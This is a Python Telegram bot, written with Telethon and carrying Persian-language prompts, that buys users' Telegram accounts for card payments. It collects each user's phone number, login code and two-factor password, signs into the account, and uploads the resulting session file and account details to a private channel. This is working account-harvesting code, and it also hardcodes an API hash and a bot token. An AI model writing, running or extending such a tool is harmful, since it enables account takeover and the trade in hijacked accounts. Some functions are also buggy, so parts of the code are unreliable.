import json
from datetime import datetime
import telethon
from telethon import events, Button
from TempClient import TempClient
from telethon.sync import TelegramClient


api_id = ("23180943")
api_hash = ("e89c763a8560766bb99cf6f342aacbef")


def read_json_file(filename):
    # Opening JSON file
    f = open(f'{21}.json')

    # returns JSON object as
    # a dictionary
    data = json.load(f)

    return data


# Path to the session file
session_file = 'bot'

bot_token = ("7162329262:AAEDJ0giaq5-B4TNH1qFBO2aB0KWHRfBNjU")

# Create a new TelegramClient for signing in
client = TelegramClient(session_file, api_id, api_hash).start(bot_token=bot_token)

support_id = ()
stage = ''

vcnl = "-1002113695404"
private_channel_id = "vcnl"
cnl = "Bot_pay_out_leader"
public_channel_username = (cnl)

try:
    users = read_json_file('users_info')
except FileNotFoundError:
    users = {}

try:
    support_messages = read_json_file('support')
except FileNotFoundError:
    support_messages = {}


def is_phone_number(text):
    text = text.replace('+', '').replace(' ', '').replace('-', '')
    return text.isdigit() and len(text) >= 11


def is_code(text):
    return text.replace(' ', '').isdigit()


def text_to_phone_number(text):
    return text.replace('+', '').replace(' ', '').replace('-', '')


# Define an event handler for incoming messages
@client.on(events.NewMessage)
async def handle_message(event):
    global stage, private_channel_id, users, support_messages
    temp_client = TempClient()
    user = await event.get_chat()
    user_id = str(user.id)
    if user_id not in users.keys():
        users[user_id] = {'sent_account': 0,
                          'paid_account': 0}

    user = await event.get_chat()
    # Get the message text
    message = event.message.text

    if not await check_channel_membership(user_id):
        await send_join_message(event)
        return

    if is_phone_number(message) and stage == 'phone_number':
        try:
            phone_number = str(message).strip()
            print(phone_number)
            temp_client.phone_number = phone_number
            temp_client.client = TelegramClient(f'accounts\\{phone_number}', api_id, api_hash)
            await temp_client.client.connect()
            response = await temp_client.client.sign_in(phone_number)
            temp_client.response = response

            await client.send_message(user, "کد ارسال شده را وارد کنید")
            stage = 'code'
        except Exception as e:
            print(e)
            await event.reply('شماره وارد شده صحیح نمی باشد. مجددا تلاش کنید')

    elif is_code(message) and stage == 'code':
        try:
            code = message.replace(' ', '')
            print(code)
            temp_client.response = code
            await temp_client.client.sign_in(temp_client.phone_number, code)
            new_message = f"""
            اکانت با شماره {temp_client.phone_number} با موفقیت دریافت شد
            جهت تایید اکانت لظفا از اکانت خارج شوید 
            سپس به ربات برگشته و از دکمه زیر استفاده کنید"""

            keyboard = [
                [
                    Button.inline("تایید اکانت", b"validate_account")
                ]
            ]

            await client.send_message(user, new_message, buttons=keyboard)


        except telethon.errors.SessionPasswordNeededError:
            await client.send_message(user, "رمز دو مرحله ای را وارد کنید")
            stage = 'password'
        except Exception as e:
            print(e)
            await event.reply('کد وارد شده دارای خطا می باشد.  مجددا تلاش کنید')

    elif stage == 'password':
        try:
            # Check if two-factor authentication is enabled
            if await client.is_user_authorized():
                # If two-factor authentication is enabled, prompt the user to enter the password
                password = message
                print(password)
                await client.sign_in(phone=temp_client.phone_number, password=password, code=temp_client.response)
                temp_client.two_factor_password = password

            # Account added successfully
            new_message = f"""
            اکانت با شماره {temp_client.phone_number} با موفقیت دریافت شد
            جهت تایید اکانت لظفا از اکانت خارج شوید 
            سپس به ربات برگشته و از دکمه زیر استفاده کنید"""

            keyboard = [
                [
                    Button.inline("تایید اکانت", b"validate_account")
                ]
            ]

            await client.send_message(user, new_message, buttons=keyboard)


        except Exception as e:
            print(e)
            await event.reply('رمز وارد شده دارای خطا می باشد.  مجددا تلاش کنید')

    elif stage == 'support':
        support_messages[user_id] = message
        write_json_file('support', support_messages)
        stage = ''
        await event.reply('پیام شما با موفقیت ثبت شد.')

    elif stage == 'accounts_number':
        paid_account = users[user_id]['paid_account']

        account_to_pay = users[user_id]['sent_account']

        able_to_pay = account_to_pay - paid_account

        if int(message) <= able_to_pay:

            await client.send_message(user, "شماره کارت خود را وارد کنید")

            stage = 'card_number'

        else:
            await client.send_message(user, "تعداد وارد شده معتبر نیست")



    elif stage == 'card_number':
        users[user_id]['card_number'] = message
        await event.reply('نام و نام خانوادگی صاحب حساب را وارد کنید.')
        stage = 'fullname'

    elif stage == 'fullname':
        users[user_id]['fullname'] = message
        await event.reply('اطلاعات شما با موفقیت ثبت شد و در اسرع وقت پول به حساب شما واریز خواهد شد.')
        stage = ''
        write_json_file('users_info', users)


# Define an event handler to respond to button clicks
@client.on(events.NewMessage(pattern='ارسال اکانت'))
async def callback_handler(event):
    global stage
    user = await event.get_chat()
    if not await check_channel_membership(user.id):
        return
    # get phone number
    # Send the message to the user
    await client.send_message(user, "شماره تلفن مورد نظر را وارد کنید")
    stage = 'phone_number'


@client.on(events.NewMessage(pattern='حساب کاربری'))
async def callback_handler(event):
    user = await event.get_chat()
    user_id = str(user.id)
    if not await check_channel_membership(user_id):
        return
    if user_id not in users.keys():
        users[user_id] = {'sent_account': 0,
                          'paid_account': 0}
    sent_account = users[user_id].get('sent_account', 0)
    paid_account = users[user_id].get('paid_account', 0)
    message = f"""
شناسه : {user_id}
تعداد اکانت ارسال شده :  {sent_account}
تعداد اکانت قابل تسویه : {sent_account - paid_account}
    """

    await event.reply(message)


@client.on(events.NewMessage(pattern='پشتیبانی'))
async def callback_handler(event):
    global support_id, stage
    user = await event.get_chat()
    user_id = str(user.id)
    if not await check_channel_membership(user_id):
        return
    stage = 'support'
    message = f"""
    👮🏻 همکاران ما در خدمت شما هستن

📨 جهت ارتباط به صورت مستقیم 👈🏻 {support_id} 
• سعی بخش پشتیبانی بر این است که تمامی پیام های دریافتی در کمتر از ۱۲ ساعت پاسخ داده شوند، بنابراین تا زمان دریافت پاسخ صبور باشید

• لطفا پیام، سوال، پیشنهاد و یا انتقاد خود را در قالب یک پیام واحد به طور کامل ارسال کنید 👇🏻
    """
    await event.reply(message)


@client.on(events.NewMessage(pattern='تسویه حساب'))
async def callback_handler(event):
    user = await event.get_chat()
    user_id = str(user.id)
    if not await check_channel_membership(user_id):
        return
    keyboard = [
        [
            Button.inline("کارت به کارت", b"payment")
        ]
    ]

    user = await event.get_chat()

    user_id = str(user.id)

    message = 0

    if user_id in users.keys():
        paid_account = users[user_id]['paid_account']

        account_to_pay = users[user_id]['sent_account']

        able_to_pay = account_to_pay - paid_account

        message = f"""
         تعداد اکانت های قابل تسویه :{able_to_pay}
         توجه کنید که اکانت هایی را میتوانید تسویه کنید که از مدت تحویل آن 3 ساعت گذشته باشد.
         می خواهید به چه شکل تسویه کنید."""

    await client.send_message(user, message, buttons=keyboard)


@client.on(events.CallbackQuery())
async def callback(event):
    global stage, private_channel_id, users, support_messages
    user = await event.get_chat()
    user_id = str(user.id)
    if user_id not in users.keys():
        users[user_id] = {'sent_account': 0,
                          'paid_account': 0}
    data = event.data
    if data == b'payment':

        user = await event.get_chat()

        user_id = str(user.id)

        if user_id in users.keys():

            paid_account = users[user_id]['paid_account']

            account_to_pay = users[user_id]['sent_account']

            if (account_to_pay - paid_account) != 0:

                await client.send_message(user, "تعداد اکانت های مورد نیاز برای تسویه را وارد کنید.")

                stage = 'accounts_number'

            else:
                await client.send_message(user, "شما تمامی اکانت های خود را تسویه کردید.")
        else:
            await client.send_message(user, "شما اکانتی اضافه نکرده اید.")
    elif data == b'check_join':
        user = await event.get_chat()

        user_id = str(user.id)

        if await check_channel_membership(user_id):
            await show_main_buttons(event)
        else:
            await send_join_message(event)

    elif data == b'validate_account':
        temp_client = TempClient()
        if not await temp_client.client.get_me():
            print((await temp_client.client.get_me()))
            # client has an user logged in
            await event.reply("هنوز دستگاهی به اکانت متصل است ")
        else:
            # send info to private channel
            filename = temp_client.phone_number
            content = temp_client.content()
            write_json_file(f'accounts\\{filename}', content)
            # json file
            await client.send_file(private_channel_id, f'accounts\\{filename}.json')
            # session file
            await client.send_file(private_channel_id, f'accounts\\{temp_client.phone_number}.session')

            stage = ''

            temp_client.reset_instance()

            if user_id not in users.keys():
                users[user_id] = {}

            users[user_id]['sent_account'] = users[user_id].get('sent_account', 0) + 1

            write_json_file('users_info', users)
            # client hasn't an user logged in
            await event.reply("عملیات با موفقیت انجام شد. ")



# Define your bot command handlers
@client.on(events.NewMessage(pattern='/start'))
async def handle_start_command(event):
    global public_channel_username

    user = await event.get_chat()

    user_id = str(user.id)

    if await check_channel_membership(user_id):
        await show_main_buttons(event)


async def show_main_buttons(event):
    markup = event.client.build_reply_markup([
        [Button.text('ارسال اکانت')],
        [Button.text('پشتیبانی'), Button.text('حساب کاربری')],
        [Button.text('تسویه حساب')]
    ])
    await event.respond("به ربات خوش آمدید!", buttons=markup)


async def send_join_message(event):
    message = f"""
    برای استفاده از ربات ابتدا باید وارد کانال زیر شوید
    @{public_channel_username}
    بعد از عضویت در کانال بر روی دکمه < تایید عضویت > بزنید."""

    keyboard = [
        [
            Button.inline("تایید عضویت", b"check_join")
        ]
    ]
    await event.respond(message, buttons=keyboard)


async def check_channel_membership(user_id):
    user_id = int(user_id)
    global public_channel_username
    try:
        # Get information about the channel
        channel_info = await client.get_entity(public_channel_username)
        # Get all participants of the channel
        participants = await client.get_participants(channel_info)
        # Check if the user ID is present in the list of participants
        return any(user_id == participant.id for participant in participants)
    except Exception as e:
        print(f"Error checking channel membership: {e}")
        return False


def get_account_to_pay(sent_account: list):
    count = 0
    now_hour = datetime.now().hour
    for hour in sent_account:
        if hour >= now_hour + 3:
            count += 1

    return count


def write_json_file(filename, content):
    # Serializing json
    json_object = json.dumps(content, indent=4)

    # Writing to sample.json
    with open(f"{filename}.json", "w") as outfile:
        outfile.write(json_object)


def read_json_file(filename):
    # Opening JSON file
    f = open(f'{filename}.json')

    # returns JSON object as
    # a dictionary
    data = json.load(f)

    return data


# Start the bot
async def main():
    await client.start()
    print("Bot started...")

    # Add command handlers
    # client.add_event_handler(start_handler, events.NewMessage(pattern='/start'))
    # client.add_event_handler(add_account_handler, events.NewMessage(pattern='/add_account'))

    # Keep the bot running
    await client.run_until_disconnected()


if __name__ == "__main__":
    import asyncio

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
